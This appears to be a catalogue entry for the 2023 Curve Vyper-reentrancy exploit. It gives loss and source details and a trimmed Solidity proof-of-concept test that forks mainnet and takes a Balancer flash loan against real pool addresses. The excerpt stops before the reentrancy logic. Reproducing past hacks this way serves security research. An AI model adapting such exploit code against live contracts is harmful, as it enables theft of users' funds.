# [?] Curve - Vyper Compiler Bug && Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: Curve_exp01
Published: 2023-07-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Curve_exp01.sol
Type: defi-exploit-poc

## Details
Lost: ~ $41M

```solidity
contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LP = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    ICurve CurvePool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
        vm.label(address(WETH), "WETH");
        vm.label(address(pETH), "pETH");
        vm.label(address(CurvePool), "CurvePool");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() external {
        deal(address(this), 0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Curve_exp01.sol_
